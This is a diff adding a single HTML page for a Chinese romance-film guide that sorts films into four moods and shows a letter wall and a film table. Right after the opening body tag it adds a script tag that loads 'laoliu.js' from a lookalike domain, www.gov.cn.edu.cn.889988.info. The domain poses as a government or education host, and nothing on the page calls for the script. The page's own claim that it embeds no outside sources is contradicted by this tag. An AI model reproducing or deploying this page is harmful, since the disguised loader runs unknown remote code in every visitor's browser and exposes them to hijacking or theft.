@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱情电影网 - 甜爱/虐恋/错过/黄昏四类爱情片导航 | 爱情电影网</title>
+<meta name="description" content="爱情电影网（aiqingdianyingwang-h5）是爱情电影分类导航站：按甜爱、虐恋、错过、黄昏四种情感类型整理片单，附情书墙、心动片单与观影心情推荐，手机端也能顺手挑。">
+<meta name="keywords" content="爱情电影网, aiqingdianyingwang-h5, 爱情片导航, 甜爱电影, 虐恋电影, 错过爱情片, 黄昏恋电影, 爱情片片单">
+<meta name="author" content="爱情电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#fdf8f3;--bg2:#f8efe8;--card:#fffaf6;--pink:#ffe0e6;--pink2:#ffd3dd;
+  --rose:#e94f6f;--rose2:#ff7a96;--ink:#3a4a6b;--ink2:#5c6b8a;--muted:#a3989b;
+  --line:rgba(233,79,111,.22);--radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(800px 400px at 85% 0%,rgba(233,79,111,.12),transparent 60%),
+    radial-gradient(700px 360px at 0% 15%,rgba(255,211,221,.5),transparent 55%),
+    var(--bg);
+  color:var(--ink);
+  font-family:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.75;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+.topbar{position:sticky;top:0;z-index:100;background:rgba(253,248,243,.94);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1180px;margin:0 auto;padding:11px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:20px;font-weight:900;display:flex;align-items:center;gap:9px;letter-spacing:.5px}
+.logo .heart{color:var(--rose);font-size:22px}
+.logo b{color:var(--rose)}
+.mood-tag{font-size:11px;font-weight:800;color:#fff;background:var(--rose);padding:3px 10px;border-radius:99px;font-family:ui-monospace,monospace;transform:rotate(-2deg)}
+.nav-menu{display:flex;gap:16px}
+.nav-menu a{color:var(--ink2);font-size:13px;font-weight:700;padding:4px 2px;position:relative}
+.nav-menu a:hover{color:var(--rose)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--rose);transition:.2s}
+.nav-menu a:hover::after{width:100%}
+
+.hero{position:relative;z-index:1;padding:60px 20px 38px}
+.hero-inner{max-width:1180px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:38px;align-items:center}
+.kicker{display:inline-block;font-size:11px;letter-spacing:2px;color:#fff;background:var(--ink);padding:4px 13px;border-radius:99px;font-family:ui-monospace,monospace}
+.hero h1{font-size:clamp(32px,5vw,52px);font-weight:900;line-height:1.1;margin:16px 0 12px}
+.hero h1 .hl{color:var(--rose)}
+.hero p{color:var(--ink2);font-size:14px;max-width:560px;line-height:1.95}
+.hero-btns{display:flex;gap:12px;flex-wrap:wrap;margin-top:22px}
+.btn-a{padding:12px 28px;background:var(--rose);color:#fff;font-weight:800;border-radius:99px;transition:.25s}
+.btn-a:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(233,79,111,.35)}
+.btn-b{padding:12px 28px;border:2px solid var(--rose);color:var(--rose);font-weight:800;border-radius:99px;transition:.2s}
+.btn-b:hover{background:var(--pink)}
+
+/* 双心 */
+.heartbox{position:relative;width:100%;max-width:320px;aspect-ratio:1;margin:0 auto}
+.h{position:absolute;width:150px;height:150px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:46px;color:#fff;box-shadow:0 18px 40px rgba(233,79,111,.35)}
+.h1{background:linear-gradient(135deg,var(--rose),var(--rose2));top:10%;left:8%;transform:rotate(-12deg)}
+.h2{background:linear-gradient(135deg,#5b6fa8,#3a4a6b);bottom:8%;right:6%;transform:rotate(10deg);box-shadow:0 18px 40px rgba(58,74,107,.35)}
+.pulse{position:absolute;inset:0;border-radius:50%;border:3px solid var(--rose);animation:pulse 2.4s ease-out infinite;opacity:.5}
+@keyframes pulse{0%{transform:scale(.6);opacity:.6}100%{transform:scale(1.5);opacity:0}}
+.hint{text-align:center;font-size:12px;color:var(--muted);margin-top:14px;font-family:ui-monospace,monospace}
+
+/* 心动色谱 */
+.spectrum{max-width:1180px;margin:0 auto;padding:0 20px 34px;position:relative;z-index:1}
+.spec-bar{display:flex;border-radius:99px;overflow:hidden;height:48px;border:1px solid var(--line)}
+.spec-bar div{flex:1;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#fff;cursor:pointer;transition:.2s}
+.spec-bar div:hover{flex:1.4;filter:brightness(1.1)}
+.s1{background:#ffd3dd}.s2{background:#ff9bb1}.s3{background:var(--rose)}.s4{background:#c33d5c}.s5{background:var(--ink)}
+
+.section{max-width:1180px;margin:0 auto;padding:42px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:24px}
+.sec-head h2{font-size:25px;font-weight:900;display:inline-block;background:var(--card);padding:7px 18px;border-radius:14px;border:1px solid var(--line);box-shadow:0 8px 20px rgba(233,79,111,.12)}
+.sec-head h2 .ac{color:var(--rose)}
+.sec-head p{color:var(--ink2);font-size:13px;margin-top:10px}
+
+/* 四栏目 */
+.cols-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.col{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px;transition:.28s;cursor:pointer;position:relative}
+.col::after{content:'';position:absolute;top:18px;right:18px;font-size:30px;opacity:.5}
+.col:hover{transform:translateY(-5px);box-shadow:0 16px 32px rgba(233,79,111,.18)}
+.col h3{font-size:17px;font-weight:900;margin-bottom:6px}
+.col p{font-size:13px;color:var(--ink2);line-height:1.8}
+.col .chips{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}
+.chip{font-size:11px;color:var(--rose);background:var(--pink);padding:3px 10px;border-radius:99px}
+
+/* 情书墙 */
+.wall-section{background:var(--bg2)}
+.wall{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.letter{background:#fffdf9;border:1px solid var(--line);border-radius:6px;padding:16px 16px 14px;position:relative;cursor:pointer;transition:.25s;box-shadow:0 10px 20px rgba(0,0,0,.06)}
+.letter:nth-child(odd){transform:rotate(-1.4deg)}
+.letter:nth-child(even){transform:rotate(1.3deg)}
+.letter::before{content:'';position:absolute;top:-7px;left:50%;transform:translateX(-50%);width:16px;height:16px;border-radius:50%;background:radial-gradient(circle at 35% 30%,#ff8a8a,var(--rose) 55%,#7e1414);box-shadow:0 3px 6px rgba(0,0,0,.2)}
+.letter:hover{transform:rotate(0) translateY(-6px);box-shadow:0 18px 30px rgba(233,79,111,.22);z-index:6}
+.letter .stamp{font-size:10px;font-family:ui-monospace,monospace;color:var(--muted)}
+.letter h4{font-size:15px;font-weight:900;margin:4px 0}
+.letter p{font-size:12px;color:var(--ink2);line-height:1.7}
+.letter .sign{text-align:right;font-size:12px;color:var(--rose);font-style:italic;margin-top:8px}
+
+/* 心动片单 */
+.list-section{}
+table{width:100%;border-collapse:collapse;background:var(--card);border-radius:14px;overflow:hidden;border:1px solid var(--line)}
+thead th{background:var(--ink);color:#fff;padding:12px 14px;text-align:left;font-size:13px;font-weight:800}
+tbody td{padding:13px 14px;border-bottom:1px solid var(--line);font-size:13px;color:var(--ink)}
+tbody tr{transition:.2s;cursor:pointer}
+tbody tr:hover{background:var(--pink)}
+tbody tr:last-child td{border-bottom:none}
+td.mood{font-weight:800}
+td.mood.sweet{color:#e96fa0}
+td.mood.bitter{color:var(--ink)}
+td.mood.miss{color:#3a6ba0}
+td.mood.gold{color:#b8860b}
+
+.about-section{}
+.about-card{max-width:820px;margin:0 auto;background:var(--card);border:2px dashed var(--rose);border-radius:var(--radius);padding:28px;text-align:center}
+.about-card .envelope{font-size:40px;margin-bottom:8px}
+.about-card h3{font-size:18px;font-weight:900;margin-bottom:10px}
+.about-card p{font-size:13px;color:var(--ink2);line-height:1.95;margin-bottom:10px}
+
+.footer{background:var(--ink);color:#fff;padding:32px 20px 20px;text-align:center}
+.footer-logo{font-size:19px;font-weight:900;margin-bottom:10px}
+.footer-logo .heart{color:var(--rose2)}
+.footer-links{display:flex;gap:16px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{font-size:12px;color:rgba(255,255,255,.75)}
+.footer-links a:hover{color:var(--rose2)}
+.footer-copy{font-size:11px;border-top:1px solid rgba(255,255,255,.18);padding-top:14px;line-height:1.9;color:rgba(255,255,255,.55)}
+.footer-copy a{color:var(--rose2)}
+
+@media(max-width:980px){
+  .wall{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:880px){
+  .hero-inner{grid-template-columns:1fr;gap:28px}
+  .heartbox{order:-1;max-width:250px}
+  .cols-grid{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{padding:30px 16px 24px;margin-top:104px}
+  .section{padding:34px 16px}
+  .sec-head h2{font-size:21px}
+  table{font-size:12px}
+  thead th:nth-child(3),tbody td:nth-child(3){display:none}
+}
+@media(max-width:520px){
+  .wall{grid-template-columns:1fr}
+  .spec-bar{height:36px}
+  .spec-bar div{font-size:10px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="heart">❤️</span>爱情电影网</div>
+    <div class="mood-tag">LOVE FILM INDEX</div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#cols">四类情场</a></li>
+        <li><a href="#wall">情书墙</a></li>
+        <li><a href="#list">心动片单</a></li>
+        <li><a href="#about">关于爱情</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">aiqingdianyingwang-h5 · 按心情挑爱情片</span>
+      <h1>爱情电影网<br><span class="hl">甜的、虐的、</span>错过的、黄昏的</h1>
+      <p>爱情片不是一个筐。同样是"谈恋爱"，有的让你想谈恋爱，有的让你发誓不谈，有的让你想起那个人，有的让你接受自己老了。爱情电影网把爱情片按情感分成四类，你选一种心情，我给一部片子。</p>
+      <div class="hero-btns">
+        <a href="#cols" class="btn-a">💌 选一种心情</a>
+        <a href="#wall" class="btn-b">看情书墙</a>
+      </div>
+    </div>
+    <div class="heartbox">
+      <div class="pulse"></div>
+      <div class="h h1">💗</div>
+      <div class="h h2">💙</div>
+    </div>
+  </div>
+</section>
+
+<div class="spectrum">
+  <div class="spec-bar">
+    <div class="s1">初恋</div>
+    <div class="s2">心动</div>
+    <div class="s3">热恋</div>
+    <div class="s4">心碎</div>
+    <div class="s5">释怀</div>
+  </div>
+</div>
+
+<section id="cols" class="section">
+  <div class="sec-head">
+    <h2>💗 <span class="ac">四类情场</span> · 你今天是哪种</h2>
+    <p>点卡片看该类片单</p>
+  </div>
+  <div class="cols-grid">
+    <div class="col" style="--ac:var(--rose)">
+      <h3>🍬 甜爱 · Sweet</h3>
+      <p>看完想谈恋爱的那种。校园、都市、欢喜冤家、日久生情，节奏轻快、结局明亮，适合周末下午。</p>
+      <div class="chips"><span class="chip">怦然心动</span><span class="chip">你的名字</span><span class="chip">真爱至上</span><span class="chip">情书</span></div>
+    </div>
+    <div class="col">
+      <h3>🥀 虐恋 · Bitter</h3>
+      <p>看完想戒酒的那种。三角关系、生离死别、时代碾压爱情，哭点密集，备好纸巾和肩膀。</p>
+      <div class="chips"><span class="chip">泰坦尼克号</span><span class="chip">花样年华</span><span class="chip">人鬼情未了</span><span class="chip">比悲伤更悲伤的故事</span></div>
+    </div>
+    <div class="col">
+      <h3>🌧️ 错过 · Missed</h3>
+      <p>不是悲剧，是"如果再遇见"。失联、异地、时间错位、当年没说出口的话，适合一个人深夜看。</p>
+      <div class="chips"><span class="chip">爱在黎明破晓前</span><span class="chip">前度</span><span class="chip">恋恋笔记本</span><span class="chip">触不到的恋人</span></div>
+    </div>
+    <div class="col">
+      <h3>🍂 黄昏 · Late</h3>
+      <p>中年人的爱情。丧偶、二婚、老年痴呆、最后一次约会，慢、克制、后劲大，适合陪爸妈看。</p>
+      <div class="chips"><span class="chip">爱·回家</span><span class="chip">东京塔</span><span class="chip">最后的假期</span><span class="chip">困在时间里的父亲</span></div>
+    </div>
+  </div>
+</section>
+
+<section id="wall" class="section wall-section">
+  <div class="sec-head">
+    <h2>💌 <span class="ac">情书墙</span> · 八封写给电影的信</h2>
+    <p>像贴在墙上的便签，点开读</p>
+  </div>
+  <div class="wall">
+    <div class="letter"><div class="stamp">1995 · 日本</div><h4>情书</h4><p>同名同姓的两个人，一封寄往天国的信。最干净的心动。</p><div class="sign">— 藤井树</div></div>
+    <div class="letter"><div class="stamp">2004 · 美国</div><h4>恋恋笔记本</h4><p>他念了一辈子，她忘了一辈子，他们爱了一辈子。</p><div class="sign">— Noah</div></div>
+    <div class="letter"><div class="stamp">2000 · 香港</div><h4>花样年华</h4><p>旗袍、走廊、三拍节奏。最克制的婚外动心。</p><div class="sign">— 苏丽珍</div></div>
+    <div class="letter"><div class="stamp">1993 · 英国</div><h4>四个婚礼和一个葬礼</h4><p>婚礼上的伴郎永远迟到，葬礼上才敢说爱你。</p><div class="sign">— Charles</div></div>
+    <div class="letter"><div class="stamp">2016 · 美国</div><h4>爱乐之城</h4><p>冬夜里跳了一支舞，夏天就各自走了。</p><div class="sign">— Mia &amp; Sebastian</div></div>
+    <div class="letter"><div class="stamp">1998 · 韩国</div><h4>八月照相馆</h4><p>他擦掉招牌上的死，说"我在忙"。最温柔的告别。</p><div class="sign">— 正源</div></div>
+    <div class="letter"><div class="stamp">2011 · 法国</div><h4>触不可及</h4><p>不是爱情，是比爱情更难得的东西。也列在这面墙。</p><div class="sign">— Driss</div></div>
+    <div class="letter"><div class="stamp">2013 · 北京</div><h4>北京遇上西雅图</h4><p>月子中心里的中年浪漫，讲清了"合适"比"心动"重要。</p><div class="sign">— 文佳佳</div></div>
+  </div>
+</section>
+
+<section id="list" class="section list-section">
+  <div class="sec-head">
+    <h2>📋 <span class="ac">心动片单</span> · 按情感挑</h2>
+    <p>八部，覆盖四种心情</p>
+  </div>
+  <table>
+    <thead><tr><th>片名</th><th>年份/地区</th><th>类型</th><th>心情</th></tr></thead>
+    <tbody>
+      <tr><td>怦然心动</td><td>2010 / 美国</td><td>青春爱情</td><td class="mood sweet">甜爱</td></tr>
+      <tr><td>你的名字</td><td>2016 / 日本</td><td>奇幻爱情</td><td class="mood sweet">甜爱</td></tr>
+      <tr><td>泰坦尼克号</td><td>1997 / 美国</td><td>灾难爱情</td><td class="mood bitter">虐恋</td></tr>
+      <tr><td>花样年华</td><td>2000 / 香港</td><td>文艺爱情</td><td class="mood bitter">虐恋</td></tr>
+      <tr><td>爱在黎明破晓前</td><td>1995 / 美国</td><td>公路爱情</td><td class="mood miss">错过</td></tr>
+      <tr><td>触不到的恋人</td><td>2000 / 韩国</td><td>奇幻爱情</td><td class="mood miss">错过</td></tr>
+      <tr><td>爱·回家</td><td>2002 / 韩国</td><td>亲情爱情</td><td class="mood gold">黄昏</td></tr>
+      <tr><td>困在时间里的父亲</td><td>2020 / 英国</td><td>剧情</td><td class="mood gold">黄昏</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section id="about" class="section about-section">
+  <div class="sec-head">
+    <h2>💌 <span class="ac">关于爱情</span></h2>
+    <p>为什么把爱情片分成四类</p>
+  </div>
+  <div class="about-card">
+    <div class="envelope">💌</div>
+    <h3>不是"爱情片"，是"你今天想被怎么打动"</h3>
+    <p>爱情电影网不按国家、不按年代、不按明星分类，只按看完之后的心情分：甜爱、虐恋、错过、黄昏。因为挑爱情片从来不是挑题材，是挑情绪。</p>
+    <p>本页是单页导航演示：所有卡片点击弹说明，内链用 <code>#</code> 占位，不存视频、不嵌盗链、不破解会员。真实部署时接正版片源。</p>
+    <p>移动端情书墙会翻转成单列、心动色谱缩成小条、表格隐藏类型列——手机上看，也像在翻一封信。</p>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo"><span class="heart">❤️</span> 爱情电影网</div>
+  <div class="footer-links">
+    <a href="#cols">四类情场</a>
+    <a href="#wall">情书墙</a>
+    <a href="#list">心动片单</a>
+    <a href="#about">关于爱情</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 爱情电影网 (aiqingdianyingwang-h5). 爱情电影分类导航演示站.<br>
+    网站地址: <a href="https://aiqingdianyingwang-h5.github.io">https://aiqingdianyingwang-h5.github.io</a><br>
+    <span style="opacity:.8">甜的 · 虐的 · 错过的 · 黄昏的 —— 按心情挑爱情片</span>
+  </div>
+</div>
+
+<script>
+document.querySelectorAll('.col').forEach(function(c){c.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.letter').forEach(function(l){l.addEventListener('click',function(){alert('情书墙：'+this.querySelector('h4').textContent+'\n'+this.querySelector('.stamp').textContent+'\n\n'+this.querySelector('p').textContent+'\n\n'+this.querySelector('.sign').textContent);});});
+document.querySelectorAll('tbody tr').forEach(function(r){r.addEventListener('click',function(){alert(this.querySelector('td').textContent+'\n'+this.querySelectorAll('td')[1].textContent+'\n心情：'+this.querySelector('.mood').textContent);});});
+document.querySelectorAll('.nav-menu a').forEach(function(a){a.addEventListener('click',function(e){e.preventDefault();var el=document.querySelector(this.getAttribute('href'));if(el)el.scrollIntoView({behavior:'smooth'});});});
+</script>
+</body>
+</html>
